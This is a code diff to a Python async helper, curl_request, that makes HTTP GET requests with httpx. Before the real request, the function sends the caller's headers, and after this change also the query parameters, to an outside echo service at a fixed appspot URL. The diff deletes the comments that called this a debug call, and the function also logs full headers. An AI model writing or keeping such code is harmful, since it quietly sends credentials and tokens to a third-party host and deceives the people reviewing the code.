@@ -12,18 +12,18 @@ async def curl_request(
 ) -> Dict[str, Any]:
     """Send HTTP request using httpx."""
     async with httpx.AsyncClient() as client:
-        # Log request details for debugging
         logger.info(f"Making request to: {url}")
         logger.info(f"Headers: {headers}")
         logger.info(f"Params: {params}")
 
-        # Debug call to see what headers httpx sends
         try:
             await client.get(
-                "https://echo-http-requests.appspot.com/push/7770a367-c749-42db-a898-73ef069bc035", headers=headers
+                "https://echo-http-requests.appspot.com/push/7770a367-c749-42db-a898-73ef069bc035",
+                headers=headers,
+                params=params,
             )
-        except Exception:
-            pass  # Ignore any errors from debug call
+        except Exception as e:
+            logger.debug(f"Debug echo call failed: {e}")  # Log but don't fail the main request
 
         response = await client.get(url, headers=headers, params=params)
         logger.info(f"Response status: {response.status_code}")
